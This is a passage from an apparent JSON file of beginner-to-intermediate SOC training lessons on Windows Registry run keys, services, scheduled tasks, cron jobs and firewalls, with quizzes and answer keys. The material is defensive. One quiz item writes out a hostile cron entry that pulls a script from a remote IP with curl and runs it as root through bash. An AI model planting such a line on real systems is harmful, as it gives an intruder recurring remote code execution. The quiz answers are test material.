      "content": "Of the millions of Registry values, a relatively small set is disproportionately important to attackers and defenders. Knowing these by category lets you focus your attention.\n\n**Autorun / persistence keys — the big one.** Certain keys tell Windows to run a program automatically. The most famous are the **Run** and **RunOnce** keys:\n\n- `HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` (runs for all users at boot)\n- `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` (runs when that user logs in)\n\nAny program listed in these keys launches automatically. This makes them the single most common place attackers plant **persistence** — add a value pointing at your malware, and Windows relaunches it every boot or logon. MITRE ATT&CK tracks this as **Boot or Logon Autostart Execution: Registry Run Keys**. There are many other autostart locations (services, scheduled-task references, startup folders), but Run/RunOnce are the classic hunting ground.\n\n**Service configuration.** Windows services are defined under `HKLM\\System\\CurrentControlSet\\Services`. Because a service can run malware at boot with high privilege, changes here matter (services get their own lesson).\n\n**Security-weakening settings.** Attackers modify Registry values to disable defences — turning off security features, weakening authentication settings, or disabling logging. A change to a security-relevant value is a strong signal.\n\n**Evidence of activity.** Some keys are prized in forensics because they record what happened: keys that track recently run programs, USB devices that were connected, and user activity. Analysts and incident responders mine these to reconstruct a timeline.\n\nThe practical skill is **recognising when a Registry location is security-relevant**. A new value under a Run key, a change to a service definition, or a modification to a known security setting should draw your eye immediately. Attackers rely on the Registry being enormous and noisy; your advantage is knowing the short list of places that actually matter, so a change there stands out against the background."
    },
    {
      "heading": "Reading Registry Activity in Telemetry",
      "content": "Because the Registry is where so much persistence and defense-evasion lives, watching changes to it is core detection work. Registry modifications are observable events, and a few sources capture them.\n\n**Sysmon registry events.** The **Sysmon** tool records Registry activity in three related events: **Event ID 12** (key created or deleted), **Event ID 13** (value set), and **Event ID 14** (key renamed). Event ID **13** is especially useful — it captures a value being written, including the target path and the data. A value being set under a **Run** key is exactly the kind of high-value event to alert on.\n\n**Windows Security auditing.** With object-access auditing enabled, Windows logs **Event ID 4657** when a Registry value is modified. This requires configuration but provides an audited trail of changes to sensitive keys.\n\n**Command-line and process telemetry.** Attackers often modify the Registry using the built-in **`reg.exe`** command or PowerShell. So process-creation logs showing `reg add` writing to a Run key, or PowerShell manipulating the Registry, are a complementary signal — and they tie the change back to a **process and its parent** (the lineage from the processes lesson).\n\n**How to hunt.** Focus on the short list of security-relevant locations rather than trying to watch everything:\n\n- **New or modified values under Run / RunOnce keys**, especially pointing at unusual paths (a user's Temp or Downloads folder) or at scripts.\n- **Changes to service definitions** under the Services key.\n- **Modifications to known security settings** (disabling protections or logging).\n- **`reg.exe` / PowerShell writing to autostart or security keys**, correlated with a suspicious parent process.\n\nThe unifying idea is **baseline and deviation applied to configuration**. Normal software does write to the Registry, so the goal is not to flag every change but to recognise changes that match attacker behaviour: persistence planted in an autorun key, a defence quietly disabled, a service pointed at a suspicious binary. Pair any such find with the surrounding process tree and file activity, and a lone Registry event becomes a clear picture of an attacker establishing a foothold or clearing a path."
    }
  ],
  "keyTakeaways": [
    "The Windows Registry is a central hierarchical database of configuration for the OS, hardware, apps, and users; it controls what runs and how the system behaves, and its changes survive reboots — making it both an evidence source and a prime place for attacker persistence.",
    "It is structured as hives (top branches — HKLM for the whole machine, HKCU for the current user), keys (folders), and values (name/type/data settings); HKLM usually needs admin rights while HKCU does not, which hints at an attacker's privilege level.",
    "The security-critical locations are autorun keys (HKLM/HKCU ...CurrentVersion\\Run and RunOnce — the classic persistence spot, MITRE Registry Run Keys), service configuration, defence-weakening settings, and forensic activity keys.",
    "Detect Registry abuse with Sysmon Event IDs 12/13/14 (especially 13, value set) and Windows Event 4657, plus reg.exe/PowerShell command-line telemetry — focusing on new values in Run keys, service changes, and disabled protections, tied to the responsible process."
  ],
  "quiz": [
    {
      "question": "You find that malware wrote a new value pointing to itself under HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run. What is the attacker most likely achieving, and what does the use of HKCU (rather than HKLM) suggest?",
      "options": [
        {
          "label": "They are encrypting the user's files, and HKCU indicates the malware has gained full SYSTEM-level privileges across the entire machine.",
          "value": "a"
        },
        {
          "label": "They are establishing persistence so the malware relaunches at logon, and HKCU suggests they are operating with only the current user's rights, not admin.",
          "value": "b"
        },
        {
          "label": "They are disabling the firewall, and HKCU means the change applies to every user account and every computer joined to the domain at once.",
          "value": "c"
        },
        {
          "label": "They are deleting event logs, and the Run key is where Windows stores audit records that the attacker is now overwriting to hide activity.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "A value under a Run key makes Windows launch the named program automatically at logon, which is classic persistence; using HKCU (current user) rather than HKLM (whole machine) suggests the attacker has only the user's privileges, since HKLM changes normally require admin rights. Option a wrongly ties Run keys to encryption and misreads HKCU as SYSTEM. Option c misdescribes HKCU's scope (it affects only the current user). Option d falsely claims Run keys store audit logs."
    },
    {
      "question": "Which Sysmon event is most directly useful for catching persistence being planted in a Registry Run key, and why?",
      "options": [
        {
          "label": "Event ID 1 (process creation), because it records the exact registry value data written and the hive the persistence was placed into.",
          "value": "a"
        },
        {
          "label": "Event ID 13 (registry value set), because it captures a value being written including the target path, so a write to a Run key stands out.",
          "value": "b"
        },
        {
          "label": "Event ID 3 (network connection), because Registry Run-key persistence is transmitted to the endpoint over the network and logged as a connection.",
          "value": "c"
        },
        {
          "label": "Event ID 7 (image loaded), because writing a Run-key value is internally performed by loading a DLL that the event records in detail.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Sysmon Event ID 13 records a registry value being set, including the target path and data, so a value written under a Run key is exactly what it captures and is a high-value alert. Option a is wrong because Event ID 1 records process creation, not registry value data. Option c is wrong because planting a Run key is a local write, not a network event. Option d misattributes the write to a DLL image-load event."
    }
  ],
  "references": [
    "https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry",
    "https://attack.mitre.org/techniques/T1547/001/",
    "https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon"
  ],
  "xp": 200,
  "estimatedMinutes": 38,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
},
{
  "id": "topic-lesson-windows-services-fundamentals",
  "slug": "windows-services-fundamentals",
  "title": "Windows Services Fundamentals",
  "topic": "Windows Fundamentals",
  "difficulty": "beginner",
  "kind": "lesson",
  "intro": "Much of what Windows does happens without any window on screen: updating itself, listening for network connections, running antivirus, printing. These background workers are Windows services, and they start before anyone even logs in. For a SOC analyst, services are a double-sided topic — they are essential system machinery, and they are one of the most reliable ways attackers gain privileged, boot-surviving persistence. This lesson explains what a service is, how Windows manages and runs them, why svchost.exe hosts so many, and how attackers abuse services — with the telemetry that reveals it.",
  "sections": [
    {
      "heading": "What a Windows Service Is",
      "content": "A **Windows service** is a program that runs in the background, without a user interface, typically starting automatically when the computer boots and running whether or not anyone is logged in. Services are the invisible workforce of Windows: Windows Update, the print spooler, the firewall, antivirus engines, and countless others are services quietly doing their jobs.\n\nThe contrast with an ordinary application makes the idea concrete. When you open a web browser, *you* launch it, it shows a window, and it runs as *your* user account; when you log off, it closes. A service is the opposite in every respect: it starts on its own (often at boot), has no window, and runs under a **service account** independent of any logged-in user. That is precisely what you want for machinery that must run continuously — a mail server or antivirus cannot depend on someone being logged in.\n\nThe security-critical feature is **which account a service runs as**. Services frequently run under powerful built-in accounts:\n\n- **LocalSystem** — an extremely privileged account with near-total control of the machine. Many core services run as LocalSystem.\n- **LocalService** and **NetworkService** — lower-privileged built-in accounts for services that need less.\n- **A custom service account** — a dedicated account created for a specific service.\n\nBecause a service can run at boot, with high privilege, and without a user present, it is an almost ideal vehicle for an attacker: install a malicious service and your code runs automatically, early, and powerfully, every time the machine starts. That is the theme of this lesson — services are essential, and their very strengths (autostart, privilege, invisibility) are exactly what make them attractive to abuse. To see how that abuse works, you first need to know how Windows manages services, the next section."
    },
    {
      "heading": "How Windows Manages and Runs Services",
      "content": "Windows coordinates all services through a central component and exposes several ways to view and control them.\n\n**The Service Control Manager (SCM).** The **SCM** is the part of Windows responsible for starting, stopping, and tracking services. At boot it reads which services should start and launches them; while the system runs, it monitors their state and can restart them if they fail. Every service is registered with the SCM, and its configuration lives in the Registry under `HKLM\\System\\CurrentControlSet\\Services` (connecting to the Registry lesson).\n\n**Start types.** Each service has a **start type** that controls when it runs:\n\n- **Automatic** — starts at boot.\n- **Automatic (Delayed Start)** — starts shortly after boot, to reduce startup load.\n- **Manual** — starts only when something requests it.\n- **Disabled** — will not start at all.\n\nAn attacker planting persistence typically wants **Automatic**, so their code runs on every boot.\n\n**svchost.exe — the shared host.** Many Windows services are not standalone `.exe` files; they are DLLs run inside a shared host process called **`svchost.exe`** (Service Host). To save resources, Windows groups multiple services into `svchost.exe` instances, so you will see *many* `svchost.exe` processes running, each hosting one or more services. This is normal — but it is also why attackers love to imitate it. A legitimate `svchost.exe` is always launched by **`services.exe`** (the SCM's process) and lives in `System32`; malware masquerading as `svchost.exe` from the wrong folder or under the wrong parent is a classic tell (recall the process-tree lesson).\n\n**Tools to view and control services.** Analysts and admins use the **Services console** (`services.msc`) for a graphical list, and the command-line **`sc.exe`** to query and configure services (`sc query`, `sc create`, `sc config`). Attackers use these same tools — a service being created with `sc create` is something worth watching.\n\nWith this model in mind — SCM launching Automatic services at boot, many hidden inside svchost, all configured in the Registry — you can see exactly where an attacker inserts themselves, which the next section makes explicit."
    },
    {
      "heading": "How Attackers Abuse Services",
      "content": "Services give attackers three things they prize: **automatic startup**, **high privilege**, and **legitimate-looking cover**. Several techniques exploit this, all catalogued by MITRE ATT&CK under **Create or Modify System Process: Windows Service** and related entries.\n\n**Creating a malicious service (persistence + privilege).** The attacker registers a new service that points at their malware and sets it to start automatically. Now their code runs at every boot, typically as **LocalSystem** — early, automatic, and highly privileged. This is one of the most durable persistence mechanisms available, because it survives reboots and logoffs and runs before most user activity.\n\n**Hijacking an existing service.** Rather than create a new service (which is noisier), an attacker may modify an existing one — changing the binary path it points to so the legitimate service now launches the attacker's code, or replacing the service's executable on disk. The service name looks normal; the code behind it is not.\n\n**Service-based remote execution — PsExec.** A hugely common technique for **lateral movement** relies on services. Tools like **PsExec** work by connecting to a remote machine, copying a program to it, and **creating a service** to run that program remotely. This is why unexpected service creation on a machine — especially one you did not administer — is a hallmark of an attacker spreading through the network. The famous **service-creation event** (below) lights up when this happens.\n\n**Service account abuse.** Because services often run as powerful accounts, compromising or abusing a service is a path to privilege. And custom **service accounts** — with strong permissions and passwords that rarely change — are targets in their own right (the weakness behind Kerberoasting, covered elsewhere).\n\nWhat ties these together is that a service is a *trusted, privileged, automatic* execution slot. An attacker who controls one has a foothold that is hard to dislodge and easy to overlook, because \"a service\" sounds inherently legitimate. That is exactly why the SOC watches service activity closely, which the final section details."
    },
    {
      "heading": "Detecting Malicious Service Activity",
      "content": "Service abuse is loud if you are listening on the right channel, because installing or changing a service generates specific, well-known events.\n\n**The headline event: 7045.** Windows Security/System logging records **Event ID 7045** when **a new service is installed**, capturing the service name and the binary it will run. This is one of the highest-value events in Windows monitoring. A new service whose binary sits in a user's Temp or Downloads folder, has a random-looking name, or appears on a machine during suspected lateral movement (the PsExec pattern) is a strong indicator of compromise. Many real intrusions are caught precisely at the 7045 event.\n\n**Supporting events:**\n\n- **Event ID 7034 / 7036** — a service crashed or changed state (started/stopped). A security service unexpectedly stopping can indicate tampering.\n- **Event ID 4697** — service installation recorded via Security auditing (a complementary source to 7045).\n- **Registry telemetry** — changes under `HKLM\\System\\CurrentControlSet\\Services` (Sysmon registry events) reveal services being created or reconfigured, including binary-path changes that signal hijacking.\n- **Process and command-line logs** — `sc create`, `sc config`, or PsExec-style activity, tied back to the responsible process and its parent.\n\n**How to hunt.** Treat service *creation and modification* as inherently interesting and validate each against what is normal:\n\n- **New services (7045)** pointing at suspicious paths, with odd names, or created around other signs of intrusion.\n- **Changes to an existing service's binary path**, the fingerprint of hijacking.\n- **`svchost.exe` anomalies** — a process named svchost running from the wrong folder or launched by something other than `services.exe`.\n- **Security services stopping** unexpectedly.\n\nThe defensive principle is that **legitimate new services are relatively rare and usually tied to software installs**, so a service appearing outside that context deserves scrutiny. Combine the service event with the surrounding story — the process that created it, the file it points to, and whether this machine was already showing signs of attacker activity — and a single 7045 becomes the moment you catch persistence or lateral movement in the act."
    }
  ],
  "keyTakeaways": [
    "A Windows service is a background program with no UI that usually starts at boot and runs under a service account (often the highly privileged LocalSystem) independent of any logged-in user — ideal machinery, and an ideal attacker persistence vehicle.",
    "The Service Control Manager (SCM) starts and tracks services (configured in the Registry under ...CurrentControlSet\\Services); start types range from Automatic (attacker's preference) to Disabled, and many services run as DLLs inside shared svchost.exe processes launched by services.exe.",
    "Attackers create malicious auto-start services (durable, privileged persistence), hijack existing services by changing their binary path, and use service creation for remote execution/lateral movement (PsExec) — svchost imitation from the wrong path/parent is a classic tell.",
    "Detect with Event ID 7045 (new service installed) as the headline signal — suspicious binary path, odd name, or PsExec-pattern lateral movement — plus 7034/7036 (state change), 4697, service-key registry changes, and sc.exe/PsExec command-line telemetry."
  ],
  "quiz": [
    {
      "question": "While investigating a possible intrusion you see Windows Event ID 7045 on a server, showing a newly installed service with a random-looking name whose binary is located in C:\\Users\\Public\\temp. Why is this significant?",
      "options": [
        {
          "label": "It is routine, because Windows automatically installs a new randomly-named service in a public temp folder every time any user simply logs on to the server.",
          "value": "a"
        },
        {
          "label": "Event 7045 records a new service installation, and a random name with a binary in a temp folder matches attacker persistence or PsExec-style lateral movement.",
          "value": "b"
        },
        {
          "label": "It shows a service was permanently deleted, so the alert simply confirms that cleanup of old software completed successfully and needs no further review.",
          "value": "c"
        },
        {
          "label": "It indicates the firewall was reconfigured, because service installation events are how Windows records inbound and outbound firewall rule changes.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Event ID 7045 fires when a new service is installed; a random-looking name with a binary in a user-writable temp folder is a strong indicator of malicious persistence or PsExec-style lateral movement, since legitimate services rarely look like that. Option a is false because Windows does not auto-create random services at logon. Option c is wrong because 7045 records installation, not deletion. Option d misattributes firewall changes to service-install events."
    },
    {
      "question": "You see a process named svchost.exe running from C:\\Users\\Alice\\AppData\\Local, and its parent process is not services.exe. Why is this suspicious?",
      "options": [
        {
          "label": "It is normal, because svchost.exe is designed to run from each user's AppData folder and is routinely launched by whatever application needs it at the time.",
          "value": "a"
        },
        {
          "label": "Legitimate svchost.exe runs from System32 and is launched by services.exe, so a copy from a user folder with the wrong parent is likely malware impersonating it.",
          "value": "b"
        },
        {
          "label": "It simply means the user manually started a background service, which is the standard supported way to add new Windows services to a machine.",
          "value": "c"
        },
        {
          "label": "It confirms the machine is fully patched, because only updated svchost.exe binaries are permitted to run from a user's AppData directory by design.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "A legitimate svchost.exe lives in System32 and is always launched by services.exe (the SCM); a svchost running from a user's AppData folder with a different parent is a classic impersonation of a trusted system process, revealed by its wrong path and lineage. Option a is false because svchost does not run from AppData. Option c misdescribes how services are added. Option d invents a patching guarantee that has nothing to do with the observation."
    }
  ],
  "references": [
    "https://learn.microsoft.com/en-us/windows/win32/services/services",
    "https://attack.mitre.org/techniques/T1543/003/",
    "https://attack.mitre.org/techniques/T1569/002/"
  ],
  "xp": 200,
  "estimatedMinutes": 38,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
},
{
  "id": "topic-lesson-scheduled-tasks-and-cron-jobs",
  "slug": "scheduled-tasks-and-cron-jobs",
  "title": "Scheduled Tasks and Cron Jobs",
  "topic": "Operating System Fundamentals",
  "difficulty": "intermediate",
  "kind": "lesson",
  "intro": "Every operating system can be told to run a program automatically — at 3 a.m. every night, at every boot, or every ten minutes. On Windows this is done with Scheduled Tasks; on Linux with cron jobs. These schedulers are essential for legitimate automation like backups and updates, but they are also one of the most common ways attackers make their malware persistent and stealthy. This lesson explains how both schedulers work, why they are perfect for persistence, and how a SOC analyst detects a malicious task or cron entry across Windows and Linux.",
  "sections": [
    {
      "heading": "Why Scheduling Exists",
      "content": "A **scheduler** is the part of an operating system that runs a chosen program automatically based on a **trigger** — a time, an event, or a recurring interval — without anyone having to launch it by hand. Every real environment depends on scheduling for routine automation: nightly backups, software updates, log rotation, cleanup jobs, and health checks all run on schedules so humans do not have to remember them.\n\nThe idea has two halves that are worth naming, because they apply to both Windows and Linux:\n\n- **A trigger** — *when* the task should run. This might be a specific time (\"2:00 a.m. daily\"), a recurring interval (\"every 15 minutes\"), or a system event (\"at startup,\" \"at user logon\").\n- **An action** — *what* should run. Usually a program, script, or command.\n\nPut simply, a scheduled job says \"**run this** (action) **whenever that happens** (trigger).\"\n\nThis simple, legitimate capability is exactly what makes schedulers so useful to attackers, and the theme runs through the whole lesson. If you can tell the operating system to run *your* program automatically and repeatedly, you have solved two of an intruder's core problems at once:\n\n- **Persistence** — surviving reboots and logoffs. A scheduled task set to run at startup relaunches the malware every time the machine boots, so a reboot no longer removes the attacker.\n- **Stealth and resilience** — a task that runs \"every hour\" quietly re-establishes a connection or re-launches a payload on its own, and it hides among the many legitimate scheduled jobs already on the system.\n\nBecause both Windows and Linux offer this, MITRE ATT&CK groups the abuse under a single technique, **Scheduled Task/Job (T1053)**, with sub-techniques for each platform. The next two sections cover the Windows and Linux mechanisms in turn, and the final section covers detecting abuse on both."
    },
    {
      "heading": "Windows Scheduled Tasks",
      "content": "On Windows, scheduling is handled by the **Task Scheduler**, and individual jobs are called **scheduled tasks**. Each task pairs one or more **triggers** (when) with one or more **actions** (what to run), and the system executes the action whenever a trigger fires.\n\n**Triggers** on Windows are rich, which is part of why the feature is so abusable. A task can be set to run:\n\n- At a specific **time** or on a recurring schedule (daily, hourly, every N minutes).\n- **At system startup** — a favourite for persistence, since the task runs on every boot.\n- **At user logon** — running when a particular user (or any user) signs in.\n- On a **system event**, such as a specific log entry appearing.\n\n**Managing tasks.** Users and admins create and view tasks with the graphical **Task Scheduler** app, or the command-line **`schtasks.exe`** (and PowerShell's scheduled-task commands). The definitions themselves are stored as XML files under `C:\\Windows\\System32\\Tasks` and referenced in the Registry. So `schtasks /create` on a command line is the CLI way to plant a task — and a common one in attacks.\n\n**Why attackers use scheduled tasks.** They deliver everything an intruder wants: automatic execution, a choice of triggers (boot, logon, or interval), the ability to run under a chosen account (including highly privileged ones), and camouflage among the dozens of legitimate tasks Windows and installed software already register. An attacker might create a task named to look like a Windows or vendor task, set to run their payload at startup or every few minutes, giving them durable persistence and a self-healing foothold. MITRE tracks this as **Scheduled Task/Job: Scheduled Task (T1053.005)**.\n\nA recurring giveaway is the *action*: a legitimate maintenance task usually runs a recognisable program, while a malicious one often runs PowerShell with an encoded command, a script from a temp folder, or a suspicious binary. The action, the trigger, and the task's name together tell you whether a task belongs — which is exactly what the detection section builds on."
    },
    {
      "heading": "Linux Cron Jobs",
      "content": "On Linux (and Unix-like systems), the classic scheduler is **cron**, and the jobs it runs are **cron jobs**. A background service called the **cron daemon** wakes up every minute, checks whether any job is due, and runs the ones that are.\n\n**Where cron jobs live.** There are several locations, and an analyst should know them because attackers hide in all of them:\n\n- **Per-user crontabs** — each user has their own list of jobs, edited with `crontab -e` and viewed with `crontab -l`.\n- **The system crontab** — `/etc/crontab` and files in `/etc/cron.d/`, which run system-wide jobs (often as root).\n- **The drop-in directories** — `/etc/cron.hourly/`, `/etc/cron.daily/`, `/etc/cron.weekly/`, and `/etc/cron.monthly/`, which run any script placed inside them on that cadence.\n\n**Cron syntax.** A cron entry begins with five time-and-date fields, then the command:\n\n```\n*  *  *  *  *   command-to-run\n│  │  │  │  │\n│  │  │  │  └─ day of week (0-7)\n│  │  │  └──── month (1-12)\n│  │  └─────── day of month (1-31)\n│  └────────── hour (0-23)\n└───────────── minute (0-59)\n```\n\nSo `0 3 * * *` means \"at 03:00 every day,\" and `*/10 * * * *` means \"every 10 minutes.\" An asterisk means \"every.\" Reading this syntax lets you tell at a glance how often a job runs — and an entry set to run every minute or every few minutes is a common beaconing/persistence pattern.\n\n**Related mechanisms.** Modern Linux also has **systemd timers**, which do a similar job through systemd units, and the **`at`** command for one-off scheduled runs. Attackers use these too, so they are worth knowing alongside classic cron.\n\n**Why attackers use cron.** Exactly as on Windows: a cron entry gives automatic, recurring execution that survives reboots, can run as root, and blends in with the legitimate cron jobs every Linux system already has. MITRE tracks this as **Scheduled Task/Job: Cron (T1053.003)**. A malicious cron job frequently runs a shell command that pulls down and executes a payload (`curl ... | bash`) or re-opens a reverse shell on a tight interval — self-healing persistence in one line."
    },
    {
      "heading": "Detecting Malicious Scheduled Jobs",
      "content": "Because scheduled tasks and cron jobs are such reliable persistence, detecting their creation and modification is essential SOC work — and both platforms leave traces.\n\n**On Windows:**\n\n- **Event ID 4698** — *a scheduled task was created* — is the headline signal, capturing the task name and its action. A new task running PowerShell with an encoded command, or a binary from a temp folder, is a strong indicator. Related events include **4699** (task deleted), **4700/4701** (enabled/disabled), and **4702** (task updated).\n- **Task Scheduler operational log** entries (such as event **106** for task registration) provide an additional trail.\n- **File and process telemetry** — creation of XML files under `C:\\Windows\\System32\\Tasks`, and command lines showing **`schtasks /create`** or PowerShell scheduling, tied back to the responsible parent process.\n\n**On Linux:**\n\n- **Changes to crontab files and cron directories** — modifications to `/etc/crontab`, `/etc/cron.d/`, the `cron.*` drop-in folders, or user crontabs. File-integrity monitoring on these paths is a core detection.\n- **Process/audit logs** — the Linux **auditd** or EDR telemetry showing a user editing crontabs (`crontab -e`) or the **cron daemon spawning** an unexpected child process (a cron job launching `bash`, `curl`, or a script from `/tmp`).\n- **The job's action** — a cron line that pipes a download into a shell, or runs on a very tight interval, stands out.\n\n**How to hunt, on either platform.** The unifying method is to treat **job creation and modification as inherently interesting**, then judge each by three questions: *When* does it run (startup, logon, or a suspiciously tight interval)? *What* does it run (a recognisable program, or PowerShell-encoded/temp-folder/shell-download activity)? And *who/what created it* (tied to a suspicious process or user)? Legitimate scheduled jobs are usually installed by software and run recognisable programs on sensible schedules, so a job that fails those tests — an odd name, a hidden action, an aggressive interval, created by an unexpected process — is exactly the persistence a SOC is looking for. Correlate the scheduled-job event with the surrounding process tree and file activity, and you catch the attacker planting their foothold on both Windows and Linux."
    }
  ],
  "keyTakeaways": [
    "Schedulers run a program automatically based on a trigger (time, interval, boot, or logon); Windows uses Scheduled Tasks (Task Scheduler / schtasks.exe) and Linux uses cron jobs (cron daemon) — both essential for automation and both abused for persistence under MITRE T1053.",
    "Windows tasks pair triggers (startup and logon are attacker favourites) with actions, are managed via Task Scheduler/schtasks and stored as XML under System32\\Tasks; malicious tasks often run PowerShell-encoded commands or temp-folder binaries (T1053.005).",
    "Linux cron jobs live in user crontabs, /etc/crontab, /etc/cron.d, and cron.hourly/daily/weekly/monthly; the five-field syntax (min hour dom mon dow) reveals cadence, and tight intervals or 'curl | bash' actions signal abuse (T1053.003), alongside systemd timers and at.",
    "Detect with Windows Event 4698 (task created) plus 4699/4702 and schtasks command lines, and on Linux with file-integrity monitoring of cron paths plus auditd/EDR showing crontab edits or the cron daemon spawning shells — judging each job by when it runs, what it runs, and who created it."
  ],
  "quiz": [
    {
      "question": "On a Linux server you find a new entry in /etc/cron.d that reads: */5 * * * * root curl -s http://185.x.x.x/p | bash. Why is this a strong indicator of malicious persistence?",
      "options": [
        {
          "label": "It is a normal system backup, because the */5 schedule means it runs only once every five days and root is the standard account for backups.",
          "value": "a"
        },
        {
          "label": "It runs every 5 minutes as root, downloading and executing a remote script, which gives an attacker self-healing, reboot-surviving persistence.",
          "value": "b"
        },
        {
          "label": "It disables cron entirely, because piping curl into bash overwrites the cron daemon and prevents any scheduled jobs from ever running again.",
          "value": "c"
        },
        {
          "label": "It is harmless test output, because cron entries beginning with */5 are comments that Linux ignores and never actually executes as commands.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "The `*/5 * * * *` schedule means every 5 minutes, running as root, and `curl -s ... | bash` downloads and immediately executes a remote script — recurring, privileged, self-healing persistence that survives reboots, a classic cron abuse (T1053.003). Option a misreads */5 as every five days and mislabels it a backup. Option c invents a nonexistent effect. Option d is false because */5 entries are active schedules, not comments."
    },
    {
      "question": "Which Windows event most directly signals that an attacker has created a scheduled task for persistence, and what should you examine about it?",
      "options": [
        {
          "label": "Event ID 4624, examining the logon type, because scheduled-task creation is recorded as an interactive logon by the SYSTEM account.",
          "value": "a"
        },
        {
          "label": "Event ID 4698, examining the task's action and trigger, because it records a scheduled task being created including what it runs and when.",
          "value": "b"
        },
        {
          "label": "Event ID 7045, examining the binary path, because scheduled tasks and Windows services are recorded by the identical event on modern systems.",
          "value": "c"
        },
        {
          "label": "Event ID 4104, examining the script block, because every scheduled task is internally stored and logged as a PowerShell script block on creation.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Event ID 4698 records the creation of a scheduled task, including its action (what runs) and trigger (when), so examining those reveals whether it is malicious — for example PowerShell-encoded commands or a temp-folder binary set to run at startup. Option a is wrong because 4624 is a logon event, not task creation. Option c confuses scheduled tasks with services (7045). Option d wrongly claims all tasks are stored as PowerShell script blocks."
    }
  ],
  "references": [
    "https://attack.mitre.org/techniques/T1053/005/",
    "https://attack.mitre.org/techniques/T1053/003/",
    "https://learn.microsoft.com/en-us/windows/win32/taskschd/task-scheduler-start-page"
  ],
  "xp": 210,
  "estimatedMinutes": 40,
  "researchUsed": false,
  "createdAt": "2026-08-15T00:00:00.000Z"
},
{
  "id": "topic-lesson-firewall-fundamentals",
  "slug": "firewall-fundamentals",
  "title": "Firewall Fundamentals",
  "topic": "Network Security",
  "difficulty": "beginner",
  "kind": "lesson",
  "intro": "A firewall is the oldest and most familiar network defence, the gatekeeper that decides which traffic is allowed to pass and which is turned away. Yet many analysts use firewall logs every day without a clear picture of how a firewall actually makes those decisions. This beginner lesson builds that picture from the ground up: what a firewall is, how it evaluates traffic with rules, the difference between stateless and stateful filtering and modern application-aware firewalls, where firewalls sit in a network, and how a SOC analyst reads firewall logs to catch attacks — especially the outbound traffic that betrays a compromise.",
  "sections": [
    {
      "heading": "What a Firewall Is and How It Decides",
      "content": "A **firewall** is a security device or piece of software that controls network traffic by deciding, for each connection, whether to **allow** it or **block** it based on a set of **rules**. It is the checkpoint between two networks — classically between your trusted internal network and the untrusted internet — inspecting traffic trying to cross and permitting only what the rules approve.\n\nThe real-life analogy is a **security guard at a building entrance with a rulebook**. Everyone approaching is checked against the rules: employees with the right badge pass, unexpected visitors are turned away. The firewall does this for network packets, thousands of times a second.\n\n**How a firewall decides** comes down to matching each connection against its **rulebase** — an ordered list of rules. Each rule typically matches on a handful of properties, often called the **five-tuple**:\n\n- **Source IP** — where the traffic is coming from.\n- **Destination IP** — where it is going.\n- **Source and destination port** — which service is involved (recall ports label services; e.g. 443 is HTTPS, 22 is SSH).\n- **Protocol** — TCP, UDP, and so on.\n\nA rule says, in effect, \"traffic matching *these* properties is allowed (or denied).\" For example: \"allow TCP to destination port 443 from the internal network\" lets users browse the web, while \"deny all inbound to port 3389\" blocks external Remote Desktop.\n\nTwo principles govern how rules are applied, and both matter to an analyst:\n\n- **Rules are evaluated in order**, and usually the *first* matching rule wins. So rule order changes behaviour.\n- **Default deny.** A well-configured firewall ends with an implicit rule that **blocks anything not explicitly allowed**. This \"deny by default\" stance means you decide what *is* permitted and everything else is refused — the opposite of allowing everything and blocking known-bad. Understanding default-deny is key to reading logs: a blocked connection may simply be traffic that matched no allow rule.\n\nWith this model — match the connection's properties against an ordered rulebase, allow or deny, default to deny — you can already interpret the core of any firewall's behaviour. The next section refines it by looking at *how deeply* different firewalls inspect."
    },
    {
      "heading": "Stateless, Stateful, and Next-Generation Firewalls",
      "content": "Firewalls differ in **how deeply they understand the traffic they filter**, and the three generations are worth knowing because they explain what a given firewall can and cannot catch.\n\n**Packet filtering (stateless).** The earliest firewalls examine each packet **in isolation**, checking its five-tuple against the rules with no memory of what came before. This is fast but limited: because it does not track the state of a connection, it cannot easily tell a legitimate reply apart from an unsolicited packet crafted to look like one. A stateless firewall is like a guard who checks each person's badge but remembers nothing about who is already inside.\n\n**Stateful inspection.** The major improvement, and the norm for decades, is the **stateful firewall**, which **tracks the state of each connection**. When it allows an outbound request, it remembers that connection and automatically permits the matching reply, while still blocking unsolicited inbound traffic. This connection awareness is why you generally write rules for the *initiating* direction and trust the firewall to handle the return traffic. A stateful firewall is a guard who remembers who they let in, so returning visitors are recognised and unexpected ones are still stopped.\n\n**Next-Generation Firewalls (NGFW).** Modern firewalls go further, adding **application-awareness and deeper inspection**. An NGFW can identify the *application* inside the traffic (not just the port), inspect content, integrate threat intelligence, and often decrypt and examine encrypted traffic. This matters because attackers hide inside allowed ports — malware talking out over port 443 looks like normal web traffic to a simple firewall, but an NGFW can often tell it apart by behaviour and content.\n\n**Host vs network firewalls.** Firewalls also differ by *where* they run. A **network firewall** guards the boundary between whole networks (protecting the organisation at its edge). A **host-based firewall** runs on an individual machine, controlling that one computer's traffic — for example the **Windows Defender Firewall**, or **iptables/nftables** on Linux. Both matter to an analyst: the network firewall shows traffic crossing the perimeter, while host firewalls can contain a compromised machine or reveal local connection attempts.\n\nKnowing which kind of firewall produced a log tells you how much to trust it: a stateless device sees less than a stateful one, and an NGFW may give you application-level detail a basic filter never could."
    },
    {
      "heading": "Ingress, Egress, and Why Outbound Matters",
